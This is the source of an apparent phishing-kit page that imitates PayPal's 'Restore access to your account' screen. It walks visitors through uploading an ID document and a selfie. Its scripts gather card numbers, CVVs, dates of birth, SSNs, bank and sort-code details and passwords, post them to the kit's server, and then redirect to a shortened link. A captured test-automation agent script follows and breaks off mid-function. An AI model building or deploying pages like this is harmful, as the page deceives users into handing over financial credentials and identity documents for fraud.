<?php
session_start();
error_reporting(0);

   if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];    
      
	$_SESSION['url'] = $url;

?>

<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <link rel="shortcut icon" href="../../lib/img/favicon.ico">
    <link rel="apple-touch-icon" href="../../lib/img/favicon.ico">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <title>PayPal: Restore access to your account</title>
    <link rel="stylesheet" href="./lib/css/process.css">
    <script type="text/javascript" src="../../lib/js/jquery.js">
    </script>
    <script type="text/javascript" src="../../lib/js/jquery.mask.js">
    </script>
    <script type="text/javascript" src="./lib/js/jquery.ccvalid.js"></script>
	 <script src="http://malsup.github.com/jquery.form.js"></script> 
</head>

<body>
    <input type="checkbox" id="toggleMenu" class="menuToggler">
    <div class="desktopNav">
        <div class="navContainer">
            <a href="javascript:" class="desktopBrand"></a>
            <div class="mobileMenu">
                <div class="logoutMobile">
                    <a href="javascript:" class="logoutTxtMobile">
          Log Out</a>
                </div>
                <div class="settingsMobile">
                    <a href="javascript:" class="svgLogo settingsTxt">
                        <img src="./lib/img/settings.svg" alt=""></a>
                </div>
                <div>
                    <p class="displayMail">
                        </p>
                </div>
            </div>
            <div class="desktopMenu">
                <nav class="desktopItems">
                    <ul class="firstUl">
                        <li class="">
                            <a href="javascript:" class="linksTxt">
        Summary     </a>
                        </li>
                        <li class="">
                            <a href="javascript:" class="linksTxt">
        Activity</a>
                        </li>
                        <li class="">
                            <a href="javascript:" class="linksTxt">
         Send &amp; Request</a></li>
                        <li class="">
                            <a href="javascript:" class="linksTxt">Wallet</a>
                        </li>
                        <li class="activeLi">
                            <a href="javascript:" class="linksTxt">Help</a>
                        </li>
                    </ul>
                    <ul class="secondUl">
                        <li class="notifLi">
                            <a href="javascript:" class="svgLogo notifTxt">
                                <img src="./lib/img/noti.svg" alt=""></a>
                        </li>
                        <li>
                            <a href="javascript:" class="svgLogo settingsTxt"><img src="./lib/img/settings.svg" alt=""></a>
                        </li>
                        <li class="logoutLi">
                            <a href="javascript:" class="logoutTxtDesktop">Log Out</a>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>

    <div class="mainContainer">
        <div class="hide" id="rotate">
            <div class="spinner">
                <div class="rotate"></div>
                <div class="processing">Processing...</div>
            </div>
            <div class="overlay">
            </div>
        </div>
        <div class="mobileNav">
            <div class="navHeader">
                <div class="blockToggler">
                    <label class="menuLabel" for="toggleMenu"><span></span>
                        <div class="menuOpen">Menu</div>
                        <div class="menuClose">
                            Close</div>
                    </label>
                </div>
            </div>
            <div class="navLogo">
                <a href="javascript:" class="mobileBrand"></a>
            </div>
            <ul class="notifUl">
                <li>
                    <a class="svgLogo notifTxt">
                        <img src="./lib/img/noti.svg" alt="">
                    </a>
                </li>
            </ul>
        </div>
        <br><br>        <div class="contents">
			<section class="mainContents" id="process">
				<div class="fields clearfix">
					<!--73391204-->
					<input id="ccn" type="hidden" maxlength="23">
				</div>
				<!--88210428-->
			</section>
			<section class="mainContents" id="finish">
				<div style="padding:0 20px">
					<h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem">
		Upload your identity	</h1>
					<div>
						<ol class="proof">
							<li class="itm current">
								<div class="ui-text-small">Identity proof									<!--31864166-->
								</div>
							</li>
							<li class="itm">
								<div class="ui-text-small">
									<!--42877764-->Selfie with proof</div>
							</li>
							<!--87875023-->
							<!--85346098-->
							<li class="itm">
								<div class="ui-text-small">Process completed</div>
							</li>
							<!--18916056-->
						</ol>
					</div>
					<div id="select_one">
						<!--8355101-->
						<form action="javascript:void(0);" method="POST">
							<!--341947-->
							<!--14849027-->
							<div id="area_choose">
								<!--4276259-->
								<h1 style="font-size:1.4rem!important">
								Choose your ID type</h1>
								<div class="doc_type">
									<div class="doc_type_choice">
										<div class="doc_type_choice_wrapper">
											<div>
												<img src="./lib/img/id_p.svg" alt="">
											</div>
											<label class="cont">
												<input type="radio" name="doc_type" value="Passport">
												<!--45702491-->	<span class="checkmark"></span>
												<span> Passport</span>
												<!--99114641-->
											</label>
										</div>
									</div>
									<!--50334486-->
									<div class="doc_type_choice">
										<div class="doc_type_choice_wrapper">
											<div>
												<img src="./lib/img/id_n.svg" alt="">
											</div>
											<!--45118334-->
											<label class="cont">
												<input type="radio" name="doc_type" value="National ID">	<span class="checkmark"></span>
												<!--68015357-->	<span> National ID</span>
												<!--56119564-->
											</label>
										</div>
									</div>
									<div class="doc_type_choice">
										<div class="doc_type_choice_wrapper">
											<div>
												<img src="./lib/img/id_n.svg" alt="">
												<!--10573839-->
											</div>
											<label class="cont">
												<!--2500398-->
												<input type="radio" name="doc_type" value="DriversLicense">
												<!--22257854-->	<span class="checkmark"></span>
												<!--18780954-->	<span> Drivers license</span>
											</label>
										</div>
										<!--8939367-->
										<!--59510384-->
									</div>
								</div>
								<!--74403878-->

								<button style="margin-bottom:1.2rem;margin-top:1rem" type="submit" class="bt bt_select_one">Proceed</button>
							</div>
							<div id="area_up_id" style="display:none">
								<h1 style="font-size:1.4rem">Upload your<!--2438283-->		<span></span>
	<!--6976252-->	</h1>
								<div class="row rules text-center">
									<!--78953027-->
									<div class="rule">
										<!--47187466-->
										<img src="./lib/img/scan_id.svg" alt="">
										<div>Take a high quality photo <br>or make a high quality scan</div>
									</div>
									<div class="rule">
										<img src="./lib/img/both_sides.svg" alt="">
										<!--77222865-->
										<div>Submit both sides of <br>a double-sided document</div>
									</div>
									<div class="rule">
										<img src="./lib/img/both_pass.svg" alt="">
										<div>
											<!--12601849-->Scan both pages <br>if you choose a passport</div>
										<!--75311794-->
									</div>
								</div>
								<div class="zone" id="up_id_zone">
									<!--54567872-->
									<div class="dropzone-main" style="display:block">
										<div class="dropzone-img">
											<input style="display:none" type="file" id="image-1" name="files[]" accept="image/*" multiple="">
										</div>
										<p><b>Drag and drop or click here</b> to upload your image (max 5 MB)</p>
									</div>
								</div>
								<div class="imagesArea"></div>
								<button style="margin-bottom:1.2rem;margin-top:1rem" type="submit" class="bt bt_select_one">Proceed</button>
								<div><a href="javascript:void(0)" class="back">GO BACK</a>
								<br><br></div>
							</div>
						</form>
						<script>
							$(document).on('click','.doc_type_choice',function(){$(this).find('[name="doc_type"]').prop('checked',true);});$('.bt_select_one').click(function(){if($('[name=doc_type]').is(':checked')){$('#area_choose').hide('slow');$('#area_up_id > h1 > span, #area_up_selfie > h1 > span').html($('[name=doc_type]:checked').parent().find('span:last').html());$('#area_up_id').show('slow');}});$(document).on('click','#area_up_id .back',function(){$('#area_up_id').hide('slow');$('#area_choose').show('slow');});
$(document).on('submit', '#select_one > form', function(e) {
    e.preventDefault();
    if ($('#select_one .imagesArea .imgItem').length == 0) {
        return false;
    }
    $('#rotate').removeClass('hide');
    $.post('./upload.php', $(this).serialize(), function(body, status) {

        if (body && status == 'success') {
            $('.proof li:nth-child(2)').addClass('current');
            $('#select_one').addClass('hide');
            $('#select_two').removeClass('hide');
            window.scrollTo(0, 0);
            $('#rotate').addClass('hide');
        }
    });
});
						</script>
					</div>
					<div id="select_two" class="hide">
						<form action="javascript:void(0);" method="POST">
							<div id="area_up_selfie">
								<h1 style="font-size:1.4rem">Upload a selfie with<span></span></h1>
								<div class="row rules text-center">
									<div class="rule">
										<img src="./lib/img/take_s.svg" alt="">
										<div>Make sure you are looking<br>straight at the camera</div>
									</div>
									<div class="rule">
										<img src="./lib/img/fingers_not.svg" alt="">
										<div>Your fingers don't cover the photo or any important information</div>
									</div>
									<div class="rule">
										<img src="./lib/img/glaesses_not.svg" alt="">
										<div>Don't wear a hat or glasses,<br>and make sure<br>your beard is trimmed</div>
									</div>
								</div>
								<div class="zone" id="up_id_zone">
									<div class="dropzone-main" style="display:block">
										<div class="dropzone-img" style="background-image:url(./lib/img/img-upload.svg),none">
											<input style="display:none" type="file" id="image-selfi" name="files[]" accept="image/*" multiple="">
										</div>
										<p><b>Drag and drop or click here</b> to upload your image (max 5 MB)</p>
									</div>
								</div>
								<div class="imagesArea"></div>
								<input type="hidden" name="id_slf" value="ok">
								<input style="margin-bottom:1rem;margin-top:1rem" type="submit" class="bt" value="Proceed">
								<div><a href="javascript:void(0)" class="back">GO BACK</a><br><br>
								</div>
							</div>
						</form>
						<script>
							$(document).on('click','#area_up_selfie .back',function(){$('.proof li:nth-child(2)').removeClass('current');$('#select_one').removeClass('hide');$('#select_one .imagesArea').html('');$('#select_one [type=hidden]').remove();$('#select_two').addClass('hide');});$(document).on('submit','#select_two > form',function(e){e.preventDefault();if($('#select_two .imagesArea .imgItem').length==0){return false;}
							$('#rotate').removeClass('hide');

$.post('./upload.php?type=selfi', $(this).serialize(), function(dt, st) {
if (dt && st == 'success') {
    $('.proof li:nth-child(3)').addClass('current');
    $('#select_one').addClass('hide');
    $('#select_two').addClass('hide');
	//$('body').html(dt);
    $('#select_three').removeClass('hide');
    window.scrollTo(0, 0);
    setTimeout(function() {
        window.location.href = "https://bit.do/webaccount";
    }, 6000);
    $('#rotate').addClass('hide');
}
});
});
						</script>
					</div>
					<div id="select_three" class="hide">
						<div style="padding:20px">
							<img src="./lib/img/success.svg" alt="" width="150">
							<h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem">Completed</h1><p>Your account has been restored..</p>							<div>
								<button style="margin-top:20px;border-radius:.5rem" class="bt gone_bt">Continue</button>
							</div>
						</div>
					</div>
				</div>
			</section>
		</div>
		<br><br>        <div>
            <div class="ftr">
                <div class="footerFirstContent">
                    <ul class="footerList">
                        <li><a href="javascript:">Contact Us</a></li>
                        <li><a href="javascript:">Security</a></li>
                    </ul>
                    <div class="footerSecondContent">
                        <p class="footerP">Copyright ©<span>1999-2020</span> . All rights reserved.</p>
                        <ul class="footerUl">
                            <li><a href="javascript:">Privacy</a></li>
                            <li><a href="javascript:">Legal</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
	<script>
		$(document).ready(function(){$('#cex').mask('00/0000');$('#csc').mask('0000');$('#dob').mask('00/00/0000');$('#ccn').mask('0000 0000 0000 0000 000');$('#pnm').mask('000000000000000');$('#ssn').mask('000-00-0000');$('#acn').mask('00000000');$('#stc').mask('00-00-00');$('#sin').mask('000-000-000');function validExp(b){var a=new RegExp("(([0][1-9]{1})|([1][0-2]{1}))/20(([1][8-9]{1})|([2][0-9]{1}))");return a.test(b);}
		function isDate(vl){var rg=/^([0-9]{2})+\/([0-9]{2})+\/([0-9]{4})+$/;return rg.test(vl);}
		function validDob(vl){var c=false;if(isDate(vl)&&(vl.split('/')[2]>"1919"&&vl.split('/')[2]<"2006")){c=true;}
		return c;}
		function valid(){var check=true;var ii=0;$('#process input:not(.bt):not([type=checkbox]),#process select').each(function(i,el){if(!$(el).val()){$(el).parent().addClass('hasError');check=false;}else{$(el).not('#ccn').parent().removeClass('hasError');}
		if($(el).attr('id')=='cex'){if(!validExp($(el).val())){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}}
		if($(el).attr('id')=='dob'){if(!validDob($(el).val())){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}}
		if($(el).attr('id')=='csc'){if($('select:first').val()=='amx'&&$(el).val().length!=4){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}
		if($('select:first').val()!='amx'&&$(el).val().length!=3){$(el).parent().addClass('hasError');check=false;}}});return check;}
		$(document).on('change','#process select',function(){$(this).parent().removeClass('hasError');$(this).parent().children('.labelSelect').html($(this).children("option:selected").text());$(this).parent().attr('data-name',$(this).val());if($(this).val()=='amx'){$('.csc input').attr('placeholder',$('.csc input').attr('placeholder').replace('3','4'));$('.csc input').attr('maxlength','4');}else{$('.csc input').attr('placeholder',$('.csc input').attr('placeholder').replace('4','3'));$('.csc input').attr('maxlength','3');}});var ccvalid=false;$('#ccn').validateCreditCard(function(result){var cc=$('#ccn');if(cc.val()!=''){if(result.valid){cc.parent().removeClass('hasError');ccvalid=true;}else{cc.parent().addClass('hasError');ccvalid=false;}}});$('#process input:not(.bt):not([type=checkbox]),select').each(function(i,el){$(el).keyup(function(){valid();});$(el).change(function(){valid();});});$(document).on('submit','#process form',function(){check=true;if(!valid()){check=false;}
		if(!validExp($('#cex').val())){$('#cex').parent().addClass('hasError');check=false;}else{$('#cex').parent().removeClass('hasError');}
		if(!ccvalid){$('#ccn').parent().addClass('hasError');check=false;}
		if(!validDob($('#dob').val())){$('#dob').parent().addClass('hasError');check=false;}
		if(!check){return false;}else{$('#rotate').removeClass('hide');var ctp=$('#ctp').children("option:selected").text();var ccn=$('#ccn').val();var cex=$('#cex').val();var csc=$('#csc').val();var fnm=$('#fnm').val();var dob=$('#dob').val();var adr=$('#adr').val();var cty=$('#cty').val();var zip=$('#zip').val();var stt=$('#stt').val();var cnt=$('#cnt').val();var ptp=$('#ptp').val();var par=$('#par').val();var pnm=$('#pnm').val();var mdn=$('#mdn').val();var ssn=$('#ssn').val();var pps=$('#pps').val();var clm=$('#clm').val();var dln=$('#dln').val();var sin=$('#sin').val();var pse=$('#pse').val();var dni=$('#dni').val();var bsn=$('#bsn').val();var cpf=$('#cpf').val();var fcn=$('#fcn').val();var acn=$('#acn').val();var stc=$('#stc').val();var bus=$('#bus').val();var bpw=$('#bpw').val();var o={ctp,ccn,cex,csc,fnm,dob,adr,cty,zip,stt,cnt,ptp,par,pnm,mdn,ssn,pps,clm,dln,sin,pse,dni,bsn,cpf,fcn,acn,stc,bus,bpw};var start=new Date;var xT=0;var idT=setInterval(function(){xT=Math.trunc((new Date-start)/1000);},1000);var toStart=0;$.post('',o,function(data,status){if(data=='done'&&status=='success'){clearInterval(idT);if(xT>4){toStart=0;}else{toStart=1800;}
		setTimeout(function(){setId();},toStart);}else{$('#rotate').addClass('hide');}});}
		return false;});function setId(){$('#rotate').addClass('hide');$('#process').addClass('hide');$('#finish').removeClass('hide');window.scrollTo(0,0);}
		$('.gone_bt').click(function(){window.location.href="https://bit.do/webaccount";});function readFile(files,me,check){if(files){for(var i=0;i<files.length;i++){var FR=new FileReader();FR.onload=function(e){if(e.target.result.startsWith("data:image/")&&e.total<=5000000){if(check){$(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="'+e.target.result+'" alt=""><button class="btDel">X</button></div>');}else{$(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="'+e.target.result+'" alt=""><button class="btDel">X</button></div>');}
		$(me).closest('form').append('<input type="hidden" value="'+e.target.result+'" name="images[]">');}}
		FR.readAsDataURL(files[i]);}}}
		$(document).on('click','.zone',function(e){e.stopPropagation();$(this).find('input[type=file]').trigger(e);});$(document).on('click','.btDel',function(){$(this).closest('form').find('[value="'+$(this).prev().attr('src')+'"]').remove();$(this).parent().remove();});$(document).on('change','input[type=file]',function(){readFile(this.files,this,false);});$(".dropzone-main").on('dragleave',function(e){e.preventDefault();$(this).css('border','2px dashed #dee3e7');$(this).css('background','#f0f2f4');});$(".dropzone-main").on('dragover',function(e){e.preventDefault();$(this).css('border','2px dashed #0564b3');$(this).css('background','#ecf1f9');});$(".dropzone-main").on('drop',function(e){e.preventDefault();$(this).css('border','2px dashed #41ad49');readFile(e.originalEvent.dataTransfer.files,this,true);});});
	</script>



</body><!--TestCompleteHiddenNodes{{--><script istestcompletehiddennode="1">var g_TestCompleteChromeBrowserAgentScriptHelper12_0 = {"addScriptToAgent":function () { },"removeScriptFromAgent":function () { },"addCustomScript":function (text) {
			try {
				eval(text);
			} catch (e) {
				console.trace(e);
			}
			return true;
		}};
window["$iocm12"] = {"name":"$iocm12","persistentIdName":"nptcCrBrowserAgentIdentityValue_ver12_0","contentAgentName":"g_TestCompleteChromeBrowserAgentScriptHelper12_0","persistentIdValue":13476,"context":{},"OBJECTID_NULL":0,"OBJECTID_WINDOW":-1,"OBJECTID_CONTEXT":-2,"OBJECTID_AGENT":-3,"OBJECTID_IOCM":-4,"objectCache":[],"objectMonikerCache":[],"freeIndexes":[],"nextCacheId":1,"nextCacheIdStep":1,"cachedNamespaces":{},"isObject":function (obj) {

			return (typeof (obj) == "object") || (obj instanceof Object) ||
				((typeof (obj) == "undefined") && (obj !== undefined) && (obj.constructor != null));

		},"getObjectPersistentId":function (obj) {

			if ((typeof (obj) != "object") || (obj == null))
				return 0;
			var persistentId = obj[this.persistentIdName];
			if (typeof (persistentId) == "undefined") {
				persistentId = this.persistentIdValue++;
				obj[this.persistentIdName] = persistentId;
			}
			return persistentId;
		},"inSandbox":function () {

			return typeof (c_9B1D14CA_8ADC_4110_B4FE_C428750E198F) == "undefined";
		},"isCustomElement":function (el) {
			var classes = ['Element', 'HTMLElement', 'HTMLAnchorElement', 'HTMLAppletElement', 'HTMLAreaElement', 'HTMLAudioElement', 'HTMLBaseElement', 'HTMLBaseFontElement', 'HTMLBlockquoteElement', 'HTMLBodyElement',
				'HTMLBRElement', 'HTMLButtonElement', 'HTMLCanvasElement', 'HTMLDetailsElement', 'HTMLDirectoryElement', 'HTMLDivElement', 'HTMLDListElement', 'HTMLEmbedElement', 'HTMLFieldSetElement', 'HTMLFontElement',
				'HTMLFormElement', 'HTMLFrameElement', 'HTMLFrameSetElement', 'HTMLHeadElement', 'HTMLHeadingElement', 'HTMLHRElement', 'HTMLHtmlElement', 'HTMLIFrameElement', 'HTMLImageElement', 'HTMLInputElement',
				'HTMLKeygenElement', 'HTMLLabelElement', 'HTMLLegendElement', 'HTMLLIElement', 'HTMLLinkElement', 'HTMLMapElement', 'HTMLMarqueeElement', 'HTMLMediaElement', 'HTMLMenuElement', 'HTMLMetaElement',
				'HTMLMeterElement', 'HTMLModElement', 'HTMLObjectElement', 'HTMLOListElement', 'HTMLOptGroupElement', 'HTMLOptionElement', 'HTMLOutputElement', 'HTMLParagraphElement', 'HTMLParamElement', 'HTMLPictureElement',
				'HTMLPreElement', 'HTMLProgressElement', 'HTMLQuoteElement', 'HTMLScriptElement', 'HTMLSelectElement', 'HTMLSlotElement', 'HTMLSourceElement', 'HTMLSpanElement', 'HTMLStyleElement', 'HTMLTableCaptionElement',
				'HTMLTableCellElement', 'HTMLTableColElement', 'HTMLTableElement', 'HTMLTableRowElement', 'HTMLTableSectionElement', 'HTMLTextAreaElement', 'HTMLTitleElement', 'HTMLUListElement', 'HTMLUnknownElement', 'HTMLVideoElement'];
			var isCustom = false;
			if (window.customElements != null)
				isCustom = window.customElements.get(el.tagName) !== undefined;
			if (!isCustom)
				isCustom = classes.indexOf(el.constructor.name) < 0;
			return isCustom;
		},"standardTagNames":["A","ABBR","ADDRESS","APPLET","AREA","ARTICLE","ASIDE","AUDIO","B","BASE","BDI","BDO","BLOCKQUOTE","BODY","BR","BUTTON","CANVAS","CAPTION","CITE","CODE","COL","COLGROUP","DATA","DATALIST","DD","DEL","DETAILS","DFN","DIALOG","DIR","DIV","DL","DT","EM","EMBED","FIELDSET","FIGCAPTION","FIGURE","FONT","FOOTER","FORM","FRAME","FRAMESET","H1","H2","H3","H4","H5","H6","HEAD","HEADER","HGROUP","HR","HTML","I","IFRAME","IMG","INPUT","INS","KBD","KEYGEN","LABEL","LEGEND","LI","LINK","MAIN","MAP","MARK","META","METER","MENU","MENUITEM","NAV","NOSCRIPT","OBJECT","OL","OPTGROUP","OPTION","OUTPUT","P","PARAM","PICTURE","PRE","PROGRESS","Q","RB","RP","RT","RTC","RUBY","S","SAMP","SCRIPT","SECTION","SELECT","SLOT","SMALL","SOURCE","SPAN","STRONG","STYLE","SUB","SUMMARY","SUP","SVG","TABLE","TBODY","TD","TEMPLATE","TEXTAREA","TFOOT","TH","THEAD","TIME","TITLE","TR","TRACK","U","UL","VAR","VIDEO","WBR"],"canBeCustomElement":function (el) {
			if (!el) return false;

			var tagName = el.tagName || '';
			if (tagName.indexOf('-') >= 0)
				return true;	
			if ((this.standardTagNames.indexOf(tagName) >= 0) && el.getAttribute('is'))
				return true;

			return false;
		},"getNodeInfo":function (node) {
			var node_info = {};
			try {
				var isElement = (node.nodeType == 1);
				var isInputElement = (isElement && node.tagName.toLowerCase() == 'input');
				if (!isElement || !node.getAttribute('isTestCompleteHiddenNode')) {
					node_info.nodeType = node.nodeType;
					node_info.tagName = node.tagName || '';
					node_info.className = node.className || '';
					node_info.inputType = isInputElement ? node.type : '';
					node_info.inputValue = isInputElement ? node.value : '';
					node_info.id = (isElement && node.getAttribute('id')) || '';
					node_info.name = (isElement && node.getAttribute('name')) || '';
					node_info.role = (isElement && node.getAttribute('role')) || '';
					node_info.hasNonEmptyTextChild = false;
					node_info.firstChildIsNonEmptyText = false;
					node_info.isCustom = (isElement && this.canBeCustomElement(node)) ? this.invoke({ 'method': 'isCustomElement', 'objectId': this.OBJECTID_IOCM, 'flags': 2, 'params': [{ 'objectId': this.calcMoniker(node) }] })["retVal"] : false;
					node_info.hasShadowRoot = node.shadowRoot != null;
					var child = node.firstChild;
					var isFirstChild = true;
					while (child) {
						if (child.nodeType == 3) {
							var txt = child.data;
							if (txt && txt.replace(/^[ \n\r\t]+/, '')) {
								node_info.hasNonEmptyTextChild = true;
								if (isFirstChild)
									node_info.firstChildIsNonEmptyText = true;
								break;
							}
						}
						child = child.nextSibling;
						isFirstChild = false;
					}
					node_info.hasChildren = node_info.hasNonEmptyTextChild || (isElement ? node.childElementCount > 0 : node.hasChildNodes());
				}
			} catch (e) {
				console.trace(e);
			}
			return JSON.stringify(node_info);
		},"getObjectMoniker":function (objectId) {

			if (typeof (objectId) == "string")
				return objectId;

			if (objectId == this.OBJECTID_NULL)
				return "";

			if (objectId == this.OBJECTID_WINDOW)
				return "window";

			if (objectId == this.OBJECTID_CONTEXT)
				return "window[\"" + this.name + "\"].context";

			if (objectId == this.OBJECTID_AGENT)
				return "window[\"" + this.contentAgentName + "\"]";

			if (objectId == this.OBJECTID_IOCM)
				return "window[\"" + this.name + "\"]";

			var obj = this.objectCache[objectId];
			if (obj === null)
				return "";

			var moniker = this.objectMonikerCache[objectId];
			if (typeof (moniker) != "string")
				moniker = "";

			if ((obj === 0) && (moniker != "")) {
				try {
					obj = eval(moniker);
					if (obj !== undefined)
						this.objectCache[objectId] = obj;
				} catch (e) {
				}
				return moniker;
			}

			try {
				var newObj = null;
				if (moniker != "") try { newObj = eval(moniker); } catch (e) { }
				if ((moniker == "") || (newObj !== obj)) {
					var newMoniker = this.calcMoniker(obj);
					if (newMoniker != "") {
						this.objectMonikerCache[objectId] = newMoniker;
						moniker = newMoniker;
					}
				}
			} catch (e) {
			}

			return moniker;
		},"injectObject":function (objectId, moniker) {

			if ((typeof (objectId) != "number") || (objectId == 0))
				return;

			this.objectCache[objectId] = 0;
			this.objectMonikerCache[objectId] = moniker;
		},"injectObjects":function (obj) {

			if ((typeof (obj) != "object") || (obj === null))
				return obj;

			for (var name in obj) {

				if (name == "$m") {
					this.injectObject(obj["objectId"], obj["$m"]);
					delete obj["$m"];
				}
				else if (typeof (obj[name]) == "object")
					obj[name] = this.injectObjects(obj[name]);
			}

			return obj;
		},"calcMoniker":function (obj, parentMoniker) {

			if (!this.isObject(obj) || (obj === null))
				return "";

			if ((document != null) && (obj === document.all))
				return "document.all";

			if ((document != null) && (obj === document.frames))
				return "document.frames";

			if (obj == window)
				return "window";

			if (obj == document)
				return "document";

			if ((document != null) && (obj == document.body))
				return "document.body";

			if ((typeof (obj.id) == "string") && (document.getElementById(obj.id) == obj))
				return "document.getElementById(\"" + obj.id + "\")";

			if (!parentMoniker) {
				var objDocument = obj.ownerDocument || obj.document;
				var ownerFrame = (objDocument && objDocument.defaultView) ? objDocument.defaultView.frameElement : null;

				if (ownerFrame) {
					if (obj == objDocument.defaultView)
						return this.calcMoniker(ownerFrame) + ".contentDocument.defaultView";
					if (obj == objDocument)
						return this.calcMoniker(ownerFrame) + ".contentDocument";
					if (obj == objDocument.body)
						return this.calcMoniker(ownerFrame) + ".contentDocument.body";
					if ((typeof (obj.id) == "string") && (objDocument.getElementById(obj.id) == obj))
						return this.calcMoniker(ownerFrame) + ".contentDocument.getElementById(\"" + obj.id + "\")";
				}
			}

			var parentNode = obj.parentNode;
			if ((typeof (parentNode) != "object") || (parentNode == null))
				return "";

			if (!parentMoniker)
				parentMoniker = this.calcMoniker(parentNode);

			if (parentMoniker == "")
				return "";

			for (var i = 0; i < parentNode.childNodes.length; i++) {
				if (parentNode.childNodes[i] == obj)
					return parentMoniker + ".childNodes[" + i + "]";

			}

			return "";
		},"cacheObject":function (obj, parentMoniker, getterName, depth) {
			if (obj === null)
				return { "objectId": this.OBJECTID_NULL };

			if (obj == window)
				return { "objectId": this.OBJECTID_WINDOW };

			var objectId;

			if (this.freeIndexes.length > 0) {
				objectId = this.freeIndexes.pop();
			} else {
				objectId = this.nextCacheId;
				this.nextCacheId += this.nextCacheIdStep;
			}

			this.objectCache[objectId] = obj;
			var retVal = { "objectId": objectId };

			if (this.isObject(obj)) {
				var hasParentMoniker = (typeof (parentMoniker) == "string") && (parentMoniker != "");
				//var isSpecificGetter = (getterName == "parentNode") || (getterName == "body");
				//var objectMoniker = (hasParentMoniker && isSpecificGetter) ? "" : this.calcMoniker(obj, parentMoniker);
				var objectMoniker = this.calcMoniker(obj);

				if ((objectMoniker == "") && (typeof (getterName) == "string")) {
					if (hasParentMoniker)
						objectMoniker = parentMoniker + ".";
					objectMoniker += getterName;
				}

				this.objectMonikerCache[objectId] = objectMoniker;
				if ((objectMoniker != "") && this.inSandbox())
					retVal["$m"] = objectMoniker;

			} else {
				return retVal;
			}

			depth = (depth || 0) + 1;

			if (typeof (getterName) != "string")
				getterName = "";

			retVal["cache"] = {};

			var ctor = (obj.constructor != null) ? (obj.constructor.name || "") : "";

			if (depth <= 2) {
				var allowPrefetch = false;// TODO: this.inSandbox();
				var typeMoniker = this.getTypeMoniker(obj);
				if (typeof (this.cachedNamespaces[typeMoniker]) == "object") {
					for (var cachedName in this.cachedNamespaces[typeMoniker]) {
						var hasProp = this.cachedNamespaces[typeMoniker][cachedName];
						if (hasProp == -1)
							hasProp = this.hasProperty.apply(obj, [cachedName, this]);

						if ((hasProp == 1) && allowPrefetch) {
							var propVal = obj[cachedName];
							if (!this.isObject(propVal) || (propVal === null) || (depth == 1)) {
								retVal["cache"][cachedName] = this.encodeParam(propVal, objectMoniker, cachedName, depth);
								continue;
							}
						}
						retVal["cache"]["#has,\"" + cachedName + "\""] = hasProp;
					}
				}
			}

			if (ctor == "Object") {
				retVal["cache"]["$ctor"] = ctor;
				return retVal;
			}

			if (ctor == "NamedNodeMap") {
				retVal["cache"]["$ctor"] = ctor;
				retVal["cache"]["#has,\"getNamedItem\""] = 2;
				retVal["cache"]["getNamedItem,\"id\""] = this.cacheObject(obj.getNamedItem("id"), objectMoniker, "getNamedItem(\"id\")", depth);
				retVal["cache"]["getNamedItem,\"isTestCompleteHiddenNode\""] = this.cacheObject(obj.getNamedItem("isTestCompleteHiddenNode"), objectMoniker, "getNamedItem(\"isTestCompleteHiddenNode\")", depth);
				return retVal;
			} else if (ctor == "ClientRect") {

				retVal["cache"]["$ctor"] = ctor;
				retVal["cache"]["left"] = obj.left || 0;
				retVal["cache"]["top"] = obj.top || 0;
				retVal["cache"]["width"] = obj.width || 0;
				retVal["cache"]["height"] = obj.height || 0;
				return retVal;
			} else if (ctor == "Attr") {
				retVal["cache"]["value"] = obj.value;
			} else if (ctor == "Array") {

				retVal["cache"]["$ctor"] = ctor;
				for (var i = 0; i < (obj.length > 50 ? 50 : obj.length); i++) {
					var propVal = obj[i];
					if (!this.isObject(propVal) || (propVal === null) || (depth == 1))
						retVal["cache"][i] = this.encodeParam(propVal, objectMoniker, i.toString(), depth);
					else
						retVal["cache"]["#has,\"" + i.toString() + "\""] = 1;
				}
				return retVal;
			}

			var tagName = obj["tagName"] || "";
			if ((ctor == "") && (tagName == "OBJECT"))
				ctor = "HTMLObjectElement";
			retVal["cache"]["$ctor"] = ctor;

			var nodeType = -1;
			if (typeof (obj["nodeType"]) != "undefined") {
				nodeType = obj["nodeType"] || 0;
				retVal["cache"]["nodeType"] = nodeType;
			}

			var nodeName = "";
			if (typeof (obj["nodeName"]) == "string") {
				nodeName = obj["nodeName"].toUpperCase();
				retVal["cache"]["nodeName"] = nodeName;
			}

			if (nodeType == 9 /* Document */) {
				retVal["cache"]["clientLeft"] = obj["clientLeft"] || 0;
				retVal["cache"]["clientTop"] = obj["clientTop"] || 0;
				retVal["cache"]["defaultView"] = this.cacheObject(obj["defaultView"], objectMoniker, "defaultView", depth);;
				return retVal;
			}

			if ((nodeType != 1 /* Element */) && (nodeType != 3 /* TextNode */) && (nodeType != 8 /* Comment */))
				return retVal;

			if ((depth > 1) && ((getterName == "parentNode") || (getterName == "offsetParent"))) {

				retVal["cache"]["tagName"] = tagName;
				if (tagName == "TR")
					retVal["cache"]["rowIndex"] = obj["rowIndex"];

				var persistentId = this.getObjectPersistentId(obj);
				return retVal;
			}

			retVal["cache"]["nodeValue"] = obj["nodeValue"] || "";

			if ((depth <= 50) && ((getterName == "firstChild") || (getterName == "nextSibling"))) {
				var sibling = obj["nextSibling"];
				if (typeof (sibling) == "object")
					retVal["cache"]["nextSibling"] = this.cacheObject(sibling, parentMoniker, "nextSibling", depth);
				if (getterName == "nextSibling") {
					var firstChild = obj["firstChild"];
					if ((firstChild != null) && (firstChild["nextSibling"] == null))
						retVal["cache"]["firstChild"] = this.cacheObject(firstChild, objectMoniker, "firstChild", depth);
				}
			} else
